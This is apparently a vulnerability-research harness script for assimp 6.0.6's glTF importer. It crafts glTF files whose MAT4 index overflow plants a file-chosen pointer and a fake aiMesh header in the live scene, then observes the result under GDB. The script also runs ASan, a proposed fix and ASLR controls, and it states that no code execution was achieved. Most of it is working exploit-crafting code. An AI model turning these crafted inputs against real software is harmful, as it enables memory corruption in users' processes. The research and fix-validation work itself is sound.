#!/usr/bin/env bash
# W22: file-chosen object pointer and fake aiMesh header in the live scene.
#
# W19 showed that the MAT4 index overflow (Indexer::GetValue<uint32_t>) covers
# all three words of the live std::vector<unique_ptr<aiMesh>> at
# glTFImporter.cpp:475. Here the vector begin is steered into the decoded
# accessor buffer, where a file-chosen 8-byte word becomes scene->mMeshes[0]
# and a file-chosen fake aiMesh header is read at that address.
#
# THE CEILING IS RUNG-4 DATA CONTROL: aiMesh has no virtuals or function
# pointers, no marker/IP/command/listener is observed, hence NO r5. The plain
# process aborts in the vector destructor after the observation because its
# begin came from the decoded buffer; that abort is a harness artifact, not a
# security claim. GDB is used only to observe the live scene at :475/:476 and
# to measure the call-site window; the crafted input is a static file.
set -euo pipefail
cd "$(dirname "$0")/.."

src=pins/assimp-6.0.6
driver=harness/bin/w12_o2
if [ ! -x "$driver" ]; then
    bash harness/run-w12.sh >/dev/null
fi
for drv in harness/bin/w5_real_vuln harness/bin/w9_real_7090; do
    if [ ! -x "$drv" ]; then
        echo "missing $drv: run 'bash harness/run-w5.sh' and 'bash harness/run-w9.sh' first" >&2
        exit 2
    fi
done
sha256sum -c PINS.sha256 >/dev/null

ev=w22/evidence
mkdir -p "$ev"
trace="$ev/w22.trace"
log="$ev/w22.log"
: >"$trace"
: >"$log"
pass=0
fail=0
check() { # name, required substring
    local name="$1" need="$2"
    if ! grep -qF "$need" "$trace"; then
        printf 'FAIL %s (missing: %s)\n' "$name" "$need" | tee -a "$log"; fail=$((fail+1)); return
    fi
    printf 'PASS %s\n' "$name" | tee -a "$log"; pass=$((pass+1))
}
pinned="$PWD/$src/code/AssetLib/glTF/glTFImporter.cpp"
line475="$pinned:475"
line204="$pinned:204"

# --- Generate a fixed-length document with a 140-byte decoded buffer. -------
python3 - <<'PY'
import base64, json, pathlib
ev = pathlib.Path('w22/evidence')
d = json.loads((pathlib.Path('w19/evidence/base.gltf')).read_text())
b = bytearray(base64.b64decode(d['buffers']['buf']['uri'].split('base64,', 1)[1]))
assert len(b) == 116
b.extend(bytes(24))
d['buffers']['buf']['byteLength'] = len(b)
d['buffers']['buf']['uri'] = d['buffers']['buf']['uri'].split('base64,', 1)[0] + \
    'base64,' + base64.b64encode(bytes(b)).decode()
p = ev / 'base140.gltf'
p.write_text(json.dumps(d, indent=2))
print('BASE bytes=%d buflen=%d' % (p.stat().st_size, len(b)))
PY
printf 'BASE bytes=%s buflen=140\n' "$(wc -c <w22/evidence/base140.gltf)" >>"$trace"

# --- Measure the last 64-byte memcpy (the index overflow) and its window. ---
cat >"$ev/discover.gdb" <<'GDB'
set disable-randomization on
start
break memcpy@plt if $rdx == 64
commands
silent
printf "DST=%p SRC=%p N=%lu\n", $rdi, $rsi, $rdx
continue
end
continue
GDB
gdb -q -batch -x "$ev/discover.gdb" --args "$driver" "$ev/base140.gltf" \
    >"$ev/discover.out" 2>&1 || true
dest=$(grep '^DST=' "$ev/discover.out" | tail -1 | awk '{print $1}' | cut -d= -f2)
srcaddr=$(grep '^DST=' "$ev/discover.out" | tail -1 | awk '{print $2}' | cut -d= -f2)
[ -n "$dest" ] && [ -n "$srcaddr" ] || { echo 'FAIL no 64-byte memcpy discovered' | tee -a "$log"; exit 1; }
printf 'DISC dst=%s src=%s\n' "$dest" "$srcaddr" >>"$trace"

cat >"$ev/window.gdb" <<GDB
set disable-randomization on
start
break memcpy@plt if \$rdx == 64 && \$rdi == $dest
continue
printf "DST=%p SRC=%p N=%lu\n", \$rdi, \$rsi, \$rdx
x/64bx \$rdi
x/16bx \$rsi
GDB
gdb -q -batch -x "$ev/window.gdb" --args "$driver" "$ev/base140.gltf" \
    >"$ev/window.out" 2>&1 || true

python3 - "$srcaddr" >"$ev/window.txt" <<'PY'
import base64, json, pathlib, re, sys, hashlib
t = pathlib.Path('w22/evidence/window.out').read_text()
assert 'DST=' in t, 'vulnerable memcpy was not reached'
rows = [l for l in t.splitlines() if re.match(r'^0x[0-9a-f]+:\s', l)]
bs = []
for l in rows:
    bs += [int(x, 16) for x in re.findall(r'\b0x([0-9a-f]{2})\b', l)]
assert len(bs) == 80, len(bs)
win, srcbytes = bytes(bs[:64]), bytes(bs[64:80])
buf = bytearray(base64.b64decode(json.loads(pathlib.Path('w22/evidence/base140.gltf').read_text())['buffers']['buf']['uri'].split('base64,', 1)[1]))
assert srcbytes == bytes(buf[36:52]), 'memcpy source is not decoded buffer + 36'
bufl = int(sys.argv[1], 16) - 36
pathlib.Path('w22/evidence/window.hex').write_text(win.hex() + '\n')
pathlib.Path('w22/evidence/bufbase.txt').write_text(hex(bufl) + '\n')
print('WIN sha256=%s src_matches_buffer=1 bufbase=%s' % (hashlib.sha256(win).hexdigest(), hex(bufl)))
PY
cat "$ev/window.txt" >>"$trace"
bufl=$(cat "$ev/bufbase.txt")

# --- Craft variants at fixed document length. ------------------------------
python3 - <<'PY'
import base64, json, pathlib
ev = pathlib.Path('w22/evidence')
win = bytearray.fromhex((ev / 'window.hex').read_text().strip())
bufl = int((ev / 'bufbase.txt').read_text().strip(), 16)
d0 = json.loads((ev / 'base140.gltf').read_text())
b0 = bytearray(base64.b64decode(d0['buffers']['buf']['uri'].split('base64,', 1)[1]))
prefix = d0['buffers']['buf']['uri'].split('base64,', 1)[0]

def variant(name, begin, finish, cap, mesh_off, nverts, nfaces):
    d = json.loads(json.dumps(d0))
    b = bytearray(b0)
    w = bytearray(win)
    w[12:20] = begin.to_bytes(8, 'little')
    w[20:28] = finish.to_bytes(8, 'little')
    w[28:36] = cap.to_bytes(8, 'little')
    b[36:100] = w
    b[100:108] = (bufl + mesh_off).to_bytes(8, 'little')  # unique_ptr slot
    b[108:mesh_off] = bytes(mesh_off - 108)
    b[mesh_off:mesh_off + 4] = (0).to_bytes(4, 'little')  # mPrimitiveTypes
    b[mesh_off + 4:mesh_off + 8] = nverts.to_bytes(4, 'little')
    b[mesh_off + 8:mesh_off + 12] = nfaces.to_bytes(4, 'little')
    d['buffers']['buf']['uri'] = prefix + 'base64,' + base64.b64encode(bytes(b)).decode()
    p = ev / (name + '.gltf')
    p.write_text(json.dumps(d, indent=2))
    assert p.stat().st_size == (ev / 'base140.gltf').stat().st_size

variant('fake90', bufl + 100, bufl + 108, bufl + 108, 116, 90, 165)
variant('fake7',  bufl + 100, bufl + 108, bufl + 108, 116, 7, 11)
variant('fakealt', bufl + 100, bufl + 108, bufl + 108, 112, 4660, 22136)
# Causal control: same fake bytes, but the vector words are the captured
# original ones, so CopyVector uses the real aiMesh pointer.
o_b = int.from_bytes(win[12:20], 'little')
o_f = int.from_bytes(win[20:28], 'little')
o_c = int.from_bytes(win[28:36], 'little')
variant('noover', o_b, o_f, o_c, 116, 90, 165)
print('VARIANTS fake90 fake7 fakealt noover length=%d' % (ev / 'fake90.gltf').stat().st_size)
PY

# --- Observe the live scene before the vector destructor runs. ------------
cat >"$ev/live.gdb" <<GDB
set disable-randomization on
set breakpoint pending on
break $line204
run
set \$sc = mScene
printf "SCENE=%p\n", \$sc
delete 1
break $line475
continue
printf "PRE begin=%p finish=%p cap=%p\n", meshes._M_impl._M_start, meshes._M_impl._M_finish, meshes._M_impl._M_end_of_storage
next
printf "LIVE nmesh=%u arr=%p ptr0=%p verts0=%u faces0=%u\n", ((aiScene*)\$sc)->mNumMeshes, ((aiScene*)\$sc)->mMeshes, ((aiScene*)\$sc)->mMeshes[0], ((aiScene*)\$sc)->mMeshes[0]->mNumVertices, ((aiScene*)\$sc)->mMeshes[0]->mNumFaces
quit
GDB
for n in fake90 fake7 fakealt noover; do
    gdb -q -batch -x "$ev/live.gdb" --args "$driver" "$ev/$n.gltf" \
        >"$ev/$n-live.out" 2>&1 || true
    printf '%s %s\n' "$n" "$(grep '^LIVE ' "$ev/$n-live.out" || true)" >>"$trace"
done

# --- Controls: vulnerable ASan, proposed fix, safe input, ASLR-on. ---------
rc=0
ASAN_OPTIONS=detect_leaks=0:abort_on_error=0 harness/bin/w5_real_vuln "$ev/fake90.gltf" \
    >"$ev/asan-vuln.out" 2>&1 || rc=$?
printf 'CTL asan-vuln rc=%s %s\n' "$rc" "$(grep -m1 'ERROR: AddressSanitizer' "$ev/asan-vuln.out" || true)" >>"$trace"
rc=0
harness/bin/w9_real_7090 "$ev/fake90.gltf" >"$ev/fixed7090.out" 2>&1 || rc=$?
printf 'CTL fixed7090 rc=%s %s\n' "$rc" "$(grep -m1 '^scene=' "$ev/fixed7090.out" || true)" >>"$trace"
rc=0
"$driver" harness/cases/safe.gltf >"$ev/safe.out" 2>&1 || rc=$?
printf 'CTL safe rc=%s %s\n' "$rc" "$(grep -m1 '^case=' "$ev/safe.out" || true)" >>"$trace"
rc=0
"$driver" "$ev/fake90.gltf" >"$ev/aslr-on.out" 2>&1 || rc=$?
printf 'NEG aslr-on rc=%s\n' "$rc" >>"$trace"

ptr90=$(printf '0x%x' $((bufl + 116)))
ptralt=$(printf '0x%x' $((bufl + 112)))
check pins 'BASE bytes=1278 buflen=140'
check source-window 'src_matches_buffer=1'
check 'fake90 scene count' 'fake90 LIVE nmesh=1'
check 'fake90 file-chosen pointer' "ptr0=$ptr90 verts0=90 faces0=165"
check 'fake7 same pointer different chosen fields' 'fake7 LIVE nmesh=1'
check 'fake7 chosen fields' "ptr0=$ptr90 verts0=7 faces0=11"
check 'fakealt steered pointer' "ptr0=$ptralt verts0=4660 faces0=22136"
check 'no-overwrite control keeps real mesh' 'noover LIVE nmesh=1'
check 'no-overwrite chosen fields absent' 'verts0=3'
check 'vulnerable ASan report' 'stack-buffer-overflow'
check 'proposed PR7090 hunk rejects index' 'CTL fixed7090 rc=1 scene=null'
check 'safe input imports' 'CTL safe rc=0 case='
check 'ASLR-on negative' 'NEG aslr-on rc=139'
printf 'TOTAL pass=%d fail=%d\n' "$pass" "$fail" >>"$trace"
sha256sum "$trace" >"$ev/w22.trace.sha256"
cat "$trace"
[ "$fail" -eq 0 ]
